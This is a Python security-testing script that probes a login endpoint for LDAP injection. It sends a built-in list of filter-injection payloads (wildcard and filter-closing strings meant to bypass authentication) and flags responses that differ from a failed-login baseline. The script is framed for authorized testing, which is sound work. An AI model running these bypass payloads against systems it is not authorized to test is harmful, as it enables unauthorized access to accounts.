#!/usr/bin/env python3
"""
LDAP Injection Tester
------------------------
Tests login/search parameters for LDAP injection using boolean-based
differential testing. LDAP search filters use a distinct syntax
(parentheses, `*`, `&`, `|`) from SQL, so injecting `*` or a
filter-closing `)(...)` sequence can turn a specific-user lookup into
a match-everything query — the LDAP equivalent of SQLi's `' OR '1'='1`.

Intended for use ONLY against systems you own or are explicitly
authorized to test.

Usage:
    python ldap_injection_tester.py --url "https://target.com/login" --user-field username --pass-field password
"""

import argparse
import sys

import requests

# Classic LDAP filter injection payloads for a (&(uid=USER)(password=PASS))-style filter
LDAP_PAYLOADS = [
    ("*", "wildcard match-all"),
    ("*)(uid=*", "filter-closing + wildcard uid bypass"),
    ("*)(&", "filter-closing + AND-injection"),
    ("admin)(&)", "filter-closing after presumed admin uid"),
    ("*)(|(uid=*", "filter-closing + OR-wildcard bypass"),
    ("\\29\\28\\7c", "hex-encoded )( | (bypasses naive string-based filtering)"),
]


def send_login(session, url, method, user_field, pass_field, user_value, pass_value, as_json, timeout):
    data = {user_field: user_value, pass_field: pass_value}
    try:
        if as_json:
            resp = session.request(method, url, json=data, timeout=timeout)
        else:
            resp = session.request(method, url, data=data, timeout=timeout)
        return resp, None
    except requests.RequestException as e:
        return None, str(e)


def main():
    parser = argparse.ArgumentParser(description="Test a login endpoint for LDAP injection using boolean-based payloads.")
    parser.add_argument("--url", required=True, help="Target login endpoint URL")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="HTTP method (default: POST)")
    parser.add_argument("--user-field", required=True, help="Username field name")
    parser.add_argument("--pass-field", required=True, help="Password field name")
    parser.add_argument("--json", action="store_true", help="Send as JSON instead of form-encoded")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds")
    args = parser.parse_args()

    print(f"[*] Target: {args.url}")
    print("-" * 60)

    with requests.Session() as session:
        baseline_resp, err = send_login(
            session, args.url, args.method, args.user_field, args.pass_field,
            "definitely_wrong_user_xyz", "definitely_wrong_pass_xyz", args.json, args.timeout
        )
        if err:
            print(f"[!] Baseline request failed: {err}", file=sys.stderr)
            sys.exit(1)

        print(f"[*] Baseline (wrong user+pass): status={baseline_resp.status_code}, length={len(baseline_resp.content)}")
        print("-" * 60)

        any_confirmed = False
        for payload, label in LDAP_PAYLOADS:
            # Inject into BOTH fields across separate attempts, since either the
            # username or password field alone might be the vulnerable one
            for field_under_test, other_value in [(args.user_field, "irrelevant"), (args.pass_field, "irrelevant")]:
                user_val = payload if field_under_test == args.user_field else "admin"
                pass_val = payload if field_under_test == args.pass_field else "irrelevant"

                resp, err = send_login(session, args.url, args.method, args.user_field, args.pass_field, user_val, pass_val, args.json, args.timeout)
                if err:
                    continue

                status_differs = resp.status_code != baseline_resp.status_code
                len_diff = abs(len(resp.content) - len(baseline_resp.content))
                len_differs = len_diff > max(20, len(baseline_resp.content) * 0.1)

                if status_differs or len_differs:
                    any_confirmed = True
                    print(f"[!!! POSSIBLE BYPASS] field={field_under_test:<12} payload={payload!r} ({label})")
                    reason = []
                    if status_differs:
                        reason.append(f"status {baseline_resp.status_code} -> {resp.status_code}")
                    if len_differs:
                        reason.append(f"length diff {len_diff}")
                    print(f"      {', '.join(reason)}")

        if not any_confirmed:
            print("[*] No payload/field combination differed from the baseline.")

    print("-" * 60)
    if any_confirmed:
        print("[!] Possible LDAP injection found. Manually confirm the response actually")
        print("    indicates authentication success (not just a different error message)")
        print("    before reporting.")
    else:
        print("[*] No LDAP injection signal detected with this payload set. Note this only")
        print("    tests common filter-injection patterns for a (&(uid=)(pass=))-style")
        print("    filter — the app's actual LDAP query structure may differ.")


if __name__ == "__main__":
    main()
